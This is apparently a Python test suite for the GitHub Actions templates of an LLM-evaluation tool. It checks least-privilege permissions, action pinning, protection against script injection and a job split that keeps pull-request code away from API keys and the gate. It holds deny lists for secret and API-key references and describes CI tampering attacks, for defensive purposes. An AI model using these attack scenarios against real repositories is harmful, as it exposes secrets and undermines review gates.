"""Tests for the GitHub Actions templates in evalsprint/templates/github and the files that ship next to them.

Two layers:

* static checks: the YAML parses, actions are major-pinned, permissions are least-privilege, no
  `${{ }}` expression is pasted into a shell script, every `evalsprint` call uses documented flags,
  the jobs are wired the way docs/ARCHITECTURE.md says (PR code only in `evals`, `compare` on the base branch);
* execution: a small GitHub Actions emulator (`Runner`) runs the real `run:` blocks of the shipped
  workflows, in order, with real bash and real git, against a local bare "origin" repository and
  stub `evalsprint`, `pip` and `gh` executables (or the real CLI, installed per job). It emulates the
  parts of the runner the templates rely on (`env`, `if`, `needs`, step and job outputs,
  `continue-on-error`, artifacts, `actions/checkout` with `ref:`), and gives every job its own workspace,
  RUNNER_TEMP and HOME, as separate runners have. That is how the security properties are tested: a pull
  request that edits its own `gate:` or baseline does not change what `compare` is given; a pull request whose
  code rewrites the trusted files, patches the installed kit or swaps the kit cannot change the verdict (and
  the single-job workflow of v0.1, kept as a fixture, shows the same attacks working); exit codes 1, 2 and 3
  each end in their own message; the sticky comment updates only the marked comment; fork pull requests warn
  instead of passing silently.

Everything is offline. Tests that need bash, git or python3 on PATH skip themselves when missing.
"""

from __future__ import annotations

import contextlib
import io
import json
import math
import os
import re
import shutil
import stat
import subprocess
import sys
import tempfile
import textwrap
import unittest
import unittest.mock
from pathlib import Path

import yaml

from tests import ROOT, TEMPLATES

GITHUB = TEMPLATES / "github"
PR_WORKFLOW = "evals.yml"
BASELINE_WORKFLOW = "evals-baseline.yml"
WORKFLOWS = (PR_WORKFLOW, BASELINE_WORKFLOW)
MARKER = "<!-- evalsprint-gate -->"

HAVE_TOOLS = all(shutil.which(tool) for tool in ("bash", "git", "python3")) and os.name != "nt"
needs_tools = unittest.skipUnless(HAVE_TOOLS, "needs bash, git and python3 on PATH (not run on Windows)")


# ----------------------------------------------------------------------------- loading helpers


FIXTURES_CI = ROOT / "tests" / "fixtures" / "ci"
SINGLE_JOB_WORKFLOW = FIXTURES_CI / "evals_single_job.yml"  # the v0.1 workflow (compare in the job that runs PR code), frozen as a negative control


def load_workflow(name: str | Path) -> dict:
    path = name if isinstance(name, Path) else GITHUB / name
    return yaml.safe_load(path.read_text(encoding="utf-8"))


def triggers(doc: dict) -> dict:
    # PyYAML follows YAML 1.1, where the bare key `on` parses as boolean True.
    return doc.get("on") or doc.get(True)


def all_steps(doc: dict) -> list[dict]:
    return [step for job in doc["jobs"].values() for step in job["steps"]]


def uses_of(doc: dict) -> set[str]:
    return {step["uses"] for step in all_steps(doc) if "uses" in step}


def step_named(doc: dict, job: str, name: str) -> dict:
    return next(step for step in doc["jobs"][job]["steps"] if step.get("name") == name or step.get("id") == name)


# The files of the candidate run that leave the job that runs the PR's code (and the only ones the compare job takes from the artifact).
CANDIDATE_FILES = ("results.jsonl", "summary.json", "calibration.json", "report.html")

# What the docs and templates may pass to each command (docs/ARCHITECTURE.md, contract C7).
CLI_FLAGS = {
    "init": {"--ci", "--force"},
    "describe": {"-c"},
    "run": {"-c", "--label", "--set", "--tags", "--limit", "--out", "--quiet", "--no-report", "--repeat", "--resume", "--retry-errors"},
    "compare": {"-c", "--gate-config", "--md", "--json"},
    "report": {"--baseline", "-c", "--gate-config", "--labels", "--judge", "-o", "--monthly-requests"},  # --gate-config: same meaning as for compare
    "calibrate": {"--labels", "--judge", "--md", "--json", "--export-fewshot", "--fewshot-max", "--holdout-frac", "--exclude-holdout"},  # --labels may be repeated (C20)
    "label": {"-o", "--csv", "--sample", "--seed", "--no-stratify", "--judge", "--previous-labels"},  # --previous-labels: incremental relabel (C20)
    "history": {"-o", "--suite"},
    "baseline": {"--to", "--force"},
    "noise": set(),  # `evalsprint noise RUN` (C19): takes no flag
}


# ------------------------------------------------------------------------------ static checks


class StaticTemplateTests(unittest.TestCase):
    def test_workflows_parse_as_yaml_with_jobs(self):
        for name in WORKFLOWS:
            with self.subTest(name=name):
                doc = load_workflow(name)
                self.assertIsInstance(doc, dict)
                self.assertTrue(doc["name"])
                self.assertTrue(doc["jobs"])

    def test_pinned_action_majors(self):
        pinned = {"actions/checkout@v5", "actions/setup-python@v6", "actions/upload-artifact@v6"}
        used = set().union(*(uses_of(load_workflow(n)) for n in WORKFLOWS))
        self.assertEqual(used & pinned, pinned)  # all three are referenced
        for name in WORKFLOWS:
            for ref in uses_of(load_workflow(name)):
                with self.subTest(name=name, ref=ref):
                    self.assertRegex(ref, r"^[\w.-]+/[\w.-]+@v\d+$")  # major-pinned, never @main / @master
        self.assertIn("actions/download-artifact@v6", uses_of(load_workflow(PR_WORKFLOW)))

    def test_pr_workflow_triggers_and_concurrency(self):
        doc = load_workflow(PR_WORKFLOW)
        on = triggers(doc)
        self.assertIn("workflow_dispatch", on)
        # No path filter on the trigger: with "LLM evals gate" required, a pull request that a filter skips never
        # receives the status and waits forever. The `changes` job filters instead (see PathFilterTests).
        self.assertEqual(set(on), {"pull_request", "workflow_dispatch"})
        self.assertFalse(on["pull_request"], "pull_request takes no `paths:` or `paths-ignore:` filter")
        self.assertNotIn("pull_request_target", on)  # would hand secrets to fork code
        self.assertTrue(doc["concurrency"]["cancel-in-progress"])
        self.assertIn("github.event.pull_request.number", doc["concurrency"]["group"])
        self.assertEqual(doc["env"]["FAIL_WITHOUT_SECRETS"], "false")  # documented opt-in, off by default
        self.assertEqual(doc["env"]["REQUIRE_BASELINE"], "false")  # false only until the first baseline is merged
        listed = [line.strip() for line in doc["env"]["EVAL_PATHS"].splitlines() if line.strip()]
        self.assertTrue(listed and all("!" not in line for line in listed), listed)

    def test_pr_workflow_permissions_are_least_privilege_per_job(self):
        doc = load_workflow(PR_WORKFLOW)
        self.assertEqual(doc["permissions"], {})  # nothing by default
        jobs = doc["jobs"]
        self.assertEqual(jobs["check-secrets"]["permissions"], {})
        self.assertEqual(jobs["changes"]["permissions"], {"contents": "read"})  # lists changed files; no keys, no PR code
        self.assertEqual(jobs["trusted"]["permissions"], {"contents": "read"})  # reads the base branch; no keys, no PR code
        self.assertEqual(jobs["evals"]["permissions"], {"contents": "read"})  # runs PR code next to the API keys
        self.assertEqual(jobs["compare"]["permissions"], {"contents": "read"})  # base branch only; no keys, no PR code
        self.assertEqual(jobs["comment"]["permissions"], {"pull-requests": "write"})
        self.assertEqual(jobs["gate"]["permissions"], {})
        # The job that runs PR code and holds the API keys can never write to the PR or the repository...
        self.assertNotIn("write", json.dumps(jobs["evals"]["permissions"]))
        # ...and the jobs that decide which pull requests get evals, and what the base branch holds, have no key and run nothing from the PR.
        for name in ("changes", "trusted"):
            text = json.dumps(jobs[name])
            self.assertNotRegex(text, r"(?<![\w-])secrets\.")  # `check-secrets.outputs...` is a job name, not a secret
            for forbidden in ("API_KEY", "pip install", "evalsprint", "setup-python"):
                with self.subTest(job=name, forbidden=forbidden):
                    self.assertNotIn(forbidden, text)
        # ...and the job that can write to the PR never checks out or runs PR code, and holds no provider key.
        comment = json.dumps(jobs["comment"])
        for forbidden in ("actions/checkout", "actions/setup-python", "API_KEY", "evalsprint run", "evalsprint compare", "pip install"):
            self.assertNotIn(forbidden, comment)

    def test_baseline_workflow_permissions_and_shape(self):
        doc = load_workflow(BASELINE_WORKFLOW)
        self.assertEqual(list(triggers(doc)), ["workflow_dispatch"])
        self.assertEqual(doc["permissions"], {})
        self.assertEqual(doc["jobs"]["baseline"]["permissions"], {"contents": "write", "pull-requests": "write"})
        text = (GITHUB / BASELINE_WORKFLOW).read_text(encoding="utf-8")
        self.assertIn("evalsprint baseline runs/main --to evals/baseline", text)
        self.assertIn("gh pr create", text)
        self.assertIn("git checkout -b", text)  # never commits straight to the default branch
        self.assertNotIn("git push origin main", text)
        for step in all_steps(doc):
            for line in step.get("run", "").splitlines():
                if "evalsprint baseline" in line:
                    self.assertNotIn("--force", line)  # an unhealthy run must never become a baseline
        self.assertIn("calibration.json", text)

    def test_no_expression_is_interpolated_into_a_shell_script(self):
        """`${{ }}` inside `run:` is script injection (branch names, titles); values travel through `env:`."""
        for name in WORKFLOWS:
            for step in all_steps(load_workflow(name)):
                script = step.get("run")
                if script:
                    with self.subTest(name=name, step=step.get("name")):
                        self.assertNotIn("${{", script)

    def test_gate_and_baseline_come_from_the_base_branch(self):
        """The comparison reads the gate and the baseline from a checkout of the base commit, in a job of its own."""
        text = (GITHUB / PR_WORKFLOW).read_text(encoding="utf-8")
        for fragment in (
            'base_sha="$(git rev-parse --verify HEAD)"',  # the trusted job: the tip of the base branch
            "ref: ${{ github.base_ref || github.event.repository.default_branch }}",
            "ref: ${{ needs.trusted.outputs.base_sha }}",  # the compare job: exactly that commit
            'evalsprint compare evals/baseline "$out/candidate" --gate-config evals/eval.yaml --md "$out/gate.md" --json "$out/gate.json"',
            'evalsprint report "$out/candidate" --baseline evals/baseline --gate-config evals/eval.yaml',
        ):
            with self.subTest(fragment=fragment):
                self.assertIn(fragment, text)
        doc = load_workflow(PR_WORKFLOW)
        # Only the compare job compares and reports against the baseline, and it never names the candidate's own config.
        for job_id, job in doc["jobs"].items():
            script = "\n".join(step.get("run", "") for step in job["steps"])
            with self.subTest(job=job_id):
                if job_id == "compare":
                    self.assertFalse(re.search(r"(?m)^\s*evalsprint\s+run\b", script))
                    self.assertNotIn("-c evals/eval.yaml", script)
                else:
                    self.assertFalse(re.search(r"(?m)^\s*evalsprint\s+compare\b", script))
                    self.assertNotRegex(script, r"(?m)^\s*evalsprint\s+report[^\n]*--baseline")
        self.assertNotIn("git show", text)  # nothing is copied out of the PR's checkout into a place the PR's code can reach
        self.assertNotIn("git archive", text)
        self.assertNotIn("RUNNER_TEMP/trusted", text)

    def test_checkouts_that_do_not_push_never_persist_the_token(self):
        """The evals job runs the PR's code: the token must not sit in .git/config for it to read. Only the workflow that pushes keeps it."""
        doc = load_workflow(PR_WORKFLOW)
        seen = 0
        for job_id, job in doc["jobs"].items():
            for step in job["steps"]:
                if str(step.get("uses", "")).startswith("actions/checkout"):
                    seen += 1
                    with self.subTest(job=job_id):
                        self.assertIs(step["with"].get("persist-credentials"), False)
                        self.assertNotIn("write", json.dumps(job["permissions"]))
        self.assertEqual(seen, 4)  # changes, trusted, evals and compare; comment and gate check out nothing
        # The history that the trusted job reads is fetched by the checkout itself: no later authenticated fetch anywhere.
        (trusted_checkout,) = [s for s in doc["jobs"]["trusted"]["steps"] if str(s.get("uses", "")).startswith("actions/checkout")]
        self.assertEqual(trusted_checkout["with"]["fetch-depth"], 0)
        for job_id in ("trusted", "evals", "compare"):
            for step in doc["jobs"][job_id]["steps"]:
                with self.subTest(job=job_id, step=step.get("name")):
                    self.assertNotRegex(step.get("run", ""), r"git (fetch|pull|clone|remote)")
        (changes_checkout,) = [s for s in doc["jobs"]["changes"]["steps"] if str(s.get("uses", "")).startswith("actions/checkout")]
        self.assertEqual(changes_checkout["with"]["fetch-depth"], 2)  # the merge commit and both parents
        # The baseline workflow pushes a branch: its checkout keeps the credentials, and says why.
        base = load_workflow(BASELINE_WORKFLOW)
        (push_checkout,) = [s for s in all_steps(base) if str(s.get("uses", "")).startswith("actions/checkout")]
        self.assertIsNot(push_checkout["with"].get("persist-credentials"), False)
        self.assertIn("persist-credentials", (GITHUB / BASELINE_WORKFLOW).read_text(encoding="utf-8"))

    def test_exit_code_branches_and_messages_are_present(self):
        doc = load_workflow(PR_WORKFLOW)
        verdict = step_named(doc, "compare", "verdict")["run"]
        for fragment in ("1) verdict=regression", "2) verdict=config_error", "3) verdict=unhealthy", "verdict=bootstrap", "verdict=baseline_missing"):
            self.assertIn(fragment, verdict)
        gate = doc["jobs"]["gate"]["steps"][0]["run"]
        self.assertIn("::error title=LLM eval baseline missing::", gate)
        self.assertIn("::error title=LLM eval regression::", gate)
        self.assertIn("::error title=LLM eval configuration error::", gate)
        self.assertIn("::error title=LLM eval infrastructure error::", gate)
        self.assertIn("not a quality regression", gate)
        self.assertIn("Eval infrastructure error, not a quality regression", verdict)

    def test_sticky_comment_uses_a_marker_not_edit_last(self):
        text = (GITHUB / PR_WORKFLOW).read_text(encoding="utf-8")
        self.assertNotIn("--edit-last", text)
        self.assertNotIn("gh pr comment", text)
        for fragment in ('MARKER: "<!-- evalsprint-gate -->"', "gh api", "--method PATCH", "--method POST", "COMMENT_AUTHOR"):
            with self.subTest(fragment=fragment):
                self.assertIn(fragment, text)

    def test_fork_and_missing_secret_handling_is_visible(self):
        doc = load_workflow(PR_WORKFLOW)
        gate_job = doc["jobs"]["gate"]
        self.assertEqual(gate_job["name"], "LLM evals gate")
        self.assertIn("!cancelled()", gate_job["if"])  # runs even when `evals` is skipped, so the required check never hangs
        script = gate_job["steps"][0]["run"]
        self.assertIn("::warning title=LLM evals did not run::", script)
        self.assertIn("GITHUB_STEP_SUMMARY", script)
        self.assertIn("FAIL_WITHOUT_SECRETS", script)
        self.assertEqual(doc["jobs"]["evals"]["needs"], ["check-secrets", "changes", "trusted"])
        self.assertIn("available == 'true'", doc["jobs"]["evals"]["if"])
        self.assertIn("relevant == 'true'", doc["jobs"]["evals"]["if"])
        self.assertEqual(gate_job["needs"], ["check-secrets", "changes", "trusted", "evals", "compare"])

    def test_every_evalsprint_command_uses_documented_flags(self):
        pattern = re.compile(r"evalsprint (init|describe|run|compare|report|calibrate|label|history|baseline|noise)\b([^\n`|]*)")
        seen = 0
        for path in [*(GITHUB / n for n in WORKFLOWS), GITHUB / "README.md"]:
            for command, rest in pattern.findall(path.read_text(encoding="utf-8")):
                seen += 1
                flags_used = set(re.findall(r"(?<!\S)(--?[A-Za-z][\w-]*)", rest))
                with self.subTest(file=path.name, command=command, flags=sorted(flags_used)):
                    self.assertLessEqual(flags_used, CLI_FLAGS[command])
        self.assertGreater(seen, 8)

    def test_documented_flags_exist_in_the_installed_cli(self):
        """Contract C7: every flag the templates and docs may use is accepted by `evalsprint <command> --help`."""
        from evalsprint.cli import build_parser

        for command, flags in CLI_FLAGS.items():
            out = io.StringIO()
            with contextlib.redirect_stdout(out), contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit):
                build_parser().parse_args([command, "--help"])
            self.assertIn("usage:", out.getvalue(), f"`evalsprint {command}` is documented but the CLI has no such command")
            for flag in flags:
                with self.subTest(command=command, flag=flag):
                    self.assertRegex(out.getvalue(), r"(?<![\w-])" + re.escape(flag) + r"(?![\w-])")

    @needs_tools
    def test_run_scripts_are_valid_bash(self):
        for name in WORKFLOWS:
            for step in all_steps(load_workflow(name)):
                script = step.get("run")
                if not script:
                    continue
                with self.subTest(name=name, step=step.get("name")):
                    result = subprocess.run(["bash", "-n"], input=script, capture_output=True, text=True)
                    self.assertEqual(result.returncode, 0, result.stderr)

    def test_embedded_python_heredocs_are_valid_python(self):
        seen = 0
        for name in WORKFLOWS:
            for step in all_steps(load_workflow(name)):
                for body in re.findall(r"<< 'PY'[^\n]*\n(.*?)\nPY\n", step.get("run", "") + "\n", re.S):
                    seen += 1
                    with self.subTest(name=name, step=step.get("name")):
                        compile(body, f"{name}:{step.get('name')}", "exec")
        self.assertGreaterEqual(seen, 4)


class SplitJobStaticTests(unittest.TestCase):
    """C3-09: the job that compares runs WITHOUT the pull request's code. The wiring that makes that true, read off the YAML."""

    doc = staticmethod(lambda: load_workflow(PR_WORKFLOW))

    @staticmethod
    def script(job: dict) -> str:
        return "\n".join(step.get("run", "") for step in job["steps"])

    @staticmethod
    def invokes(job: dict, command: str) -> bool:
        """Does a step of the job run `evalsprint <command>` (as opposed to naming it in a message)?"""
        return any(re.search(rf"(?m)^\s*evalsprint\s+{command}\b", step.get("run", "")) for step in job["steps"])

    def test_the_job_graph(self):
        jobs = self.doc()["jobs"]
        self.assertEqual(list(jobs), ["check-secrets", "changes", "trusted", "evals", "compare", "comment", "gate"])
        self.assertEqual(jobs["trusted"]["needs"], ["check-secrets", "changes"])
        self.assertEqual(jobs["evals"]["needs"], ["check-secrets", "changes", "trusted"])
        self.assertEqual(jobs["compare"]["needs"], ["trusted", "evals"])
        self.assertEqual(jobs["comment"]["needs"], "compare")  # the comment text comes from the trusted job, not from the PR's
        self.assertIn("!cancelled()", jobs["compare"]["if"])  # decides even when `evals` was skipped (missing baseline) or failed early
        self.assertIn("needs.trusted.result == 'success'", jobs["compare"]["if"])
        for job_id, job in jobs.items():
            with self.subTest(job=job_id):
                self.assertIn("timeout-minutes", job)

    def test_the_prs_code_runs_in_one_job_only(self):
        """Only `evals` executes `evalsprint run` (the PR's adapter and judges) and only `evals` can use a provider key."""
        jobs = self.doc()["jobs"]
        for job_id, job in jobs.items():
            text = json.dumps(job)
            with self.subTest(job=job_id):
                self.assertEqual(self.invokes(job, "run"), job_id == "evals")
                if job_id == "evals":
                    self.assertIn("ANTHROPIC_API_KEY", text)
                elif job_id == "check-secrets":  # it only tests whether a key exists; it checks out and installs nothing
                    self.assertNotIn("uses", text)
                    self.assertNotIn("pip install", text)
                else:
                    for forbidden in ("ANTHROPIC_API_KEY", "OPENAI_API_KEY", "secrets.ANTHROPIC", "secrets.OPENAI"):
                        self.assertNotIn(forbidden, text)
        # The only secret the compare job may name is the read-only token for a private kit repository, and only at the install step.
        compare = jobs["compare"]
        self.assertEqual(sorted(set(re.findall(r"(?<![\w-])secrets\.(\w+)", json.dumps(compare)))), ["EVALSPRINT_READ_TOKEN"])
        for step in compare["steps"]:
            if "secrets." in json.dumps(step):
                self.assertEqual(step["name"], "Install the kit from the base branch")

    def test_the_evals_job_holds_no_trusted_file_and_compares_nothing(self):
        evals = self.doc()["jobs"]["evals"]
        script = self.script(evals)
        self.assertFalse(self.invokes(evals, "compare"))
        for forbidden in ("--gate-config", "--baseline", "trusted", "base_sha", "git show", "git archive", "gate.md", "gate.json"):
            with self.subTest(forbidden=forbidden):
                self.assertNotIn(forbidden, script)
        self.assertNotIn("base_sha", json.dumps(evals))
        (checkout,) = [s for s in evals["steps"] if str(s.get("uses", "")).startswith("actions/checkout")]
        self.assertNotIn("ref", checkout["with"])  # a pull request checks out the merge of the PR into the base: that is the point of this job
        # What it hands over is data: the candidate run, under a name the compare job downloads.
        (upload,) = [s for s in evals["steps"] if str(s.get("uses", "")).startswith("actions/upload-artifact")]
        self.assertEqual(upload["with"]["path"].split(), [f"runs/candidate/{name}" for name in CANDIDATE_FILES])  # an explicit list, never the folder
        self.assertEqual(upload["with"]["if-no-files-found"], "error")
        self.assertEqual(evals["outputs"], {"run_exit_code": "${{ steps.run.outputs.exit_code }}"})

    def test_the_compare_job_checks_out_the_base_commit_and_installs_the_kit_from_it(self):
        compare = self.doc()["jobs"]["compare"]
        steps = compare["steps"]
        names = [s.get("name") or s.get("uses") for s in steps]
        (checkout,) = [s for s in steps if str(s.get("uses", "")).startswith("actions/checkout")]
        self.assertEqual(checkout["with"]["ref"], "${{ needs.trusted.outputs.base_sha }}")  # the commit the trusted job read
        self.assertIs(checkout["with"]["persist-credentials"], False)
        order = {name: i for i, name in enumerate(names)}
        install, compare_step = order["Install the kit from the base branch"], order["Compare with the baseline from the base branch"]
        self.assertLess(order["actions/checkout@v5"], install)  # the requirements file read by pip is the base branch's
        self.assertLess(install, compare_step)
        self.assertLess(order["Download the candidate run"], compare_step)
        install_script = steps[install]["run"]
        self.assertIn("pip install -r evals/requirements.txt", install_script)
        self.assertFalse(self.invokes(compare, "run"))

    def test_the_compare_job_restores_no_cache_the_evals_job_could_have_written(self):
        """A pip cache written by the evals job (PR code) and restored here would be a way back in: there is none."""
        doc = self.doc()
        compare_text = json.dumps(doc["jobs"]["compare"])
        self.assertNotIn("actions/cache", compare_text)
        for step in doc["jobs"]["compare"]["steps"]:
            if str(step.get("uses", "")).startswith("actions/setup-python"):
                self.assertNotIn("cache", step["with"])
                self.assertNotIn("cache-dependency-path", step["with"])
        self.assertIn("cache", [k for s in doc["jobs"]["evals"]["steps"] if str(s.get("uses", "")).startswith("actions/setup-python") for k in s["with"]])

    def test_the_candidate_travels_as_an_artifact_under_one_name(self):
        jobs = self.doc()["jobs"]
        (upload,) = [s for s in jobs["evals"]["steps"] if str(s.get("uses", "")).startswith("actions/upload-artifact")]
        (download,) = [s for s in jobs["compare"]["steps"] if str(s.get("uses", "")).startswith("actions/download-artifact")]
        self.assertEqual(upload["with"]["name"], download["with"]["name"])
        self.assertEqual(download["with"]["name"], "eval-candidate-${{ github.event.pull_request.number || 'manual' }}")
        self.assertEqual(download["with"]["path"], "${{ runner.temp }}/eval-in")  # a staging folder outside the base checkout; the kit reads the filtered copy
        comment_download = [s for s in jobs["comment"]["steps"] if str(s.get("uses", "")).startswith("actions/download-artifact")]
        self.assertEqual(comment_download[0]["with"]["name"], "eval-gate-${{ github.event.pull_request.number }}")

    def test_the_gate_job_reads_the_verdict_of_the_compare_job_and_fails_closed_on_every_other_job(self):
        gate = self.doc()["jobs"]["gate"]
        self.assertEqual(gate["env"]["VERDICT"], "${{ needs.compare.outputs.verdict }}")
        self.assertEqual(gate["env"]["EXIT_CODE"], "${{ needs.compare.outputs.exit_code }}")
        script = gate["steps"][0]["run"]
        for fragment in ('"$TRUSTED_RESULT" != "success"', '"$CHANGES_RESULT" != "success"', '"$SECRETS_RESULT" != "success"'):
            with self.subTest(fragment=fragment):
                self.assertIn(fragment, script)


class ShippedFilesTests(unittest.TestCase):
    def test_requirements_template_pins_the_kit_and_documents_private_repos(self):
        text = (TEMPLATES / "evals" / "requirements.txt").read_text(encoding="utf-8")
        requirement_lines = [line for line in text.splitlines() if line.strip() and not line.lstrip().startswith("#")]
        self.assertTrue(any(re.fullmatch(r"evalsprint @ git\+https://github\.com/\S+@v\d+\.\d+\.\d+", line) for line in requirement_lines), requirement_lines)
        self.assertIn("PIN THE KIT", text)
        self.assertIn("EVALSPRINT_READ_TOKEN", text)
        self.assertIn("read-only", text)
        # the pin is the version that ships these templates: a release that forgot to move it would hand clients an old kit
        import evalsprint

        pinned = {re.search(r"@v(\d+\.\d+\.\d+)$", line).group(1) for line in requirement_lines if line.startswith("evalsprint @ git+")}
        self.assertEqual(pinned, {evalsprint.__version__})
        self.assertIn(f"evalsprint=={evalsprint.__version__}", text)
        self.assertIn("base branch", text)  # the comparison job installs the kit from this file on the base branch

    def test_codeowners_example_protects_evals_and_the_workflows(self):
        lines = [
            line.split()
            for line in (GITHUB / "CODEOWNERS.example").read_text(encoding="utf-8").splitlines()
            if line.strip() and not line.lstrip().startswith("#")
        ]
        owned = {pattern for pattern, *_owners in lines}
        self.assertIn("/evals/", owned)  # a trailing slash covers evals/** (gate:, baseline/, cases, adapter, requirements)
        self.assertIn("/.github/workflows/evals.yml", owned)
        self.assertIn("/.github/workflows/evals-baseline.yml", owned)
        self.assertIn("/.github/CODEOWNERS", owned)
        for pattern, *owners in lines:
            self.assertTrue(owners and all(o.startswith("@") for o in owners), pattern)

    def test_eval_yaml_template_documents_the_real_default_gate(self):
        """The template says its `gate:` block IS the defaults (auto rule included): keep it that way."""
        from evalsprint.config import SuiteConfig
        from evalsprint.gate_defaults import DEFAULT_GATE

        cfg = SuiteConfig.load(TEMPLATES / "eval.yaml")
        self.assertEqual(cfg.gate, DEFAULT_GATE)
        raw = yaml.safe_load((TEMPLATES / "eval.yaml").read_text(encoding="utf-8"))["gate"]
        self.assertEqual(set(raw), set(DEFAULT_GATE), "every gate key is spelled out in the template, none is missing")
        self.assertEqual(raw["max_pass_rate_drop"], "auto")
        text = (TEMPLATES / "eval.yaml").read_text(encoding="utf-8")
        for topic in ("BASE branch", "max_removed_cases", "UNHEALTHY", "repeat:", "max_output_chars", "max_section_chars", "allow_repeat_change", "JUDGE_PROVIDER=mock"):
            self.assertIn(topic, text)
        # below ~150 cases one attempt per case is too noisy for a gate: the template repeats every case 3 times, and shows the
        # recommended per_tag line (C17) as a comment to uncomment once the critical cases carry a tag
        self.assertEqual(cfg.repeat["n"], 3)
        self.assertFalse(cfg.repeat.get("per_tag") or cfg.repeat.get("tags"), "the scaffold repeats every case the same number of times")
        self.assertRegex(text, r"(?m)^  # per_tag: \{safety: 5\}")
        self.assertEqual(raw["tag_drop_min_cases"], 20)
        # the numbered list of reasons the template shows ends with the protocol rule the comparison applies last but one
        self.assertRegex(text, r"(?m)^#\s+10\. the evaluation protocol changed")

    def test_the_offline_judge_is_wired_and_only_the_mock_provider_reads_it(self):
        """`JUDGE_PROVIDER=mock` runs the template's LLM judge on `offline_judge`; the default stays a real provider."""
        from evalsprint.config import SuiteConfig
        from evalsprint.loader import load_callable

        cfg = SuiteConfig.load(TEMPLATES / "eval.yaml")
        (llm,) = [j for j in cfg.judges if j["type"] == "llm"]
        self.assertEqual(llm["provider"], "anthropic")  # the default: CI can never be graded by the placeholder
        self.assertEqual(llm["provider_options"], {"responder": "target_adapter.py:offline_judge"})
        with unittest.mock.patch.dict(os.environ, {"JUDGE_PROVIDER": "mock"}):
            (mock_llm,) = [j for j in SuiteConfig.load(TEMPLATES / "eval.yaml").judges if j["type"] == "llm"]
        self.assertEqual(mock_llm["provider"], "mock")
        with unittest.mock.patch.object(sys, "dont_write_bytecode", True):  # the templates folder is data: no __pycache__ in it
            judge = load_callable(mock_llm["provider_options"]["responder"], TEMPLATES)
        self.assertEqual(judge.__name__, "offline_judge")
        rubric = yaml.safe_load((TEMPLATES / "rubric.yaml").read_text(encoding="utf-8"))
        ids = [c["id"] for c in rubric["criteria"]]
        self.assertTrue(ids)

    def test_the_offline_judge_answers_every_criterion_of_the_prompt_it_is_given(self):
        """Unit test of the placeholder judge: one verdict per criterion line, `pass` unless the delimited output is empty."""
        import importlib.util

        spec = importlib.util.spec_from_file_location("template_adapter", TEMPLATES / "target_adapter.py")
        adapter = importlib.util.module_from_spec(spec)
        with unittest.mock.patch.object(sys, "dont_write_bytecode", True):  # the templates folder is data: no __pycache__ in it
            spec.loader.exec_module(adapter)
        system = "Grade the output.\n\nCriteria:\n- grounded [critical]: states only what the context supports\n- polite: is courteous\n- no_pii: has no personal data\n"
        for output, expected in (("Refunds take 5 days.", True), ("", False), ("   \n", False)):
            with self.subTest(output=output):
                user = f"<ai_output_0123abcd>\n{output}\n</ai_output_0123abcd>"
                reply = json.loads(adapter.offline_judge(system, [{"role": "user", "content": user}]))
                self.assertEqual(list(reply["criteria"]), ["grounded", "polite", "no_pii"])
                for verdict in reply["criteria"].values():
                    self.assertEqual(verdict["pass"], expected)
                    self.assertIn("not a measurement", verdict["reasoning"])
        self.assertEqual(json.loads(adapter.offline_judge("", []))["criteria"], {})

    def test_github_readme_covers_the_essentials(self):
        text = (GITHUB / "README.md").read_text(encoding="utf-8")
        for topic in (
            "ANTHROPIC_API_KEY",
            "evals/baseline",
            "samples: 3",
            "summary.json",
            "evalsprint baseline",
            "CODEOWNERS",
            "LLM evals gate",
            "FAIL_WITHOUT_SECRETS",
            "EVALSPRINT_READ_TOKEN",
            "<!-- evalsprint-gate -->",
            "not a quality regression",
            "base branch",
            "--gate-config",
            "EVAL_PATHS",
            "REQUIRE_BASELINE",
            "persist-credentials",
            "baseline missing",
            "Dependabot",
            "## 11. Data handling",
            "retention-days",
            "production-derived",
            "eval-candidate-",
            "eval-report-",
            "eval-gate-",
            ".label_secret",
            "`trusted`",
            "`compare`",
        ):
            with self.subTest(topic=topic):
                self.assertIn(topic, text)
        # the artifact names the README gives are the ones the workflow really uses
        workflow = (GITHUB / PR_WORKFLOW).read_text(encoding="utf-8")
        for prefix in ("eval-candidate-", "eval-report-", "eval-gate-"):
            with self.subTest(artifact=prefix):
                self.assertIn(prefix, workflow)

    def test_the_ci_readme_states_the_honest_limit_of_the_split(self):
        """The PR's code still writes the candidate results: the docs must say what the split does and does not protect."""
        text = (GITHUB / "README.md").read_text(encoding="utf-8")
        section4 = text.split("## 4. ", 1)[1].split("## 5. ", 1)[0]
        for topic in ("The results themselves", "canned good answers", "hand-written result file", "Only review closes this", "CODEOWNERS is required", "spend limit", "workflow files"):
            with self.subTest(topic=topic):
                self.assertIn(topic, section4)
        readme = (ROOT / "README.md").read_text(encoding="utf-8")
        arch = (ROOT / "docs" / "ARCHITECTURE.md").read_text(encoding="utf-8")
        method = (ROOT / "docs" / "METHODOLOGY.md").read_text(encoding="utf-8")
        for name, doc in (("README.md", readme), ("ARCHITECTURE.md", arch), ("METHODOLOGY.md", method), ("github/README.md", text)):
            with self.subTest(file=name):
                self.assertRegex(doc, r"(?i)(results|candidate)[^.]{0,200}(pull request|PR)'s (own )?code|PR's code[^.]{0,200}(result|candidate)")
            for overclaim in ("tamper-proof", "cannot be bypassed", "cannot be forged", "impossible to cheat"):
                self.assertNotIn(overclaim, doc, name)

    def test_the_ci_readme_explains_the_missing_paths_filter_and_never_recommends_one(self):
        text = (GITHUB / "README.md").read_text(encoding="utf-8")
        self.assertIn("no `paths:` filter", text)
        self.assertNotIn("Either drop the filter", text)  # the old advice, from before the `changes` job
        self.assertNotIn("trigger paths", text)
        self.assertNotIn("The `paths:` filter and `cancel-in-progress`", text)
        for name in WORKFLOWS:  # and the shipped workflows do not carry one (a commented example in the baseline workflow is fine)
            live = "\n".join(line for line in (GITHUB / name).read_text(encoding="utf-8").splitlines() if not line.lstrip().startswith("#"))
            if name == PR_WORKFLOW:
                self.assertNotIn("paths:", live)

    def test_the_first_install_and_the_flip_of_require_baseline_are_explained_where_people_look(self):
        text = (GITHUB / "README.md").read_text(encoding="utf-8")
        section3 = text.split("## 3. ", 1)[1].split("## 4. ", 1)[0]
        self.assertIn('set `REQUIRE_BASELINE: "true"`', section3)
        self.assertIn("admin override", section3)  # the pull request that restores a lost baseline
        section6 = text.split("## 6. ", 1)[1].split("## 7. ", 1)[0]
        self.assertIn('`REQUIRE_BASELINE: "true"`', section6)
        wf = load_workflow(PR_WORKFLOW)
        self.assertIn("README, section 3", (GITHUB / PR_WORKFLOW).read_text(encoding="utf-8"))
        self.assertEqual(wf["env"]["REQUIRE_BASELINE"], "false")


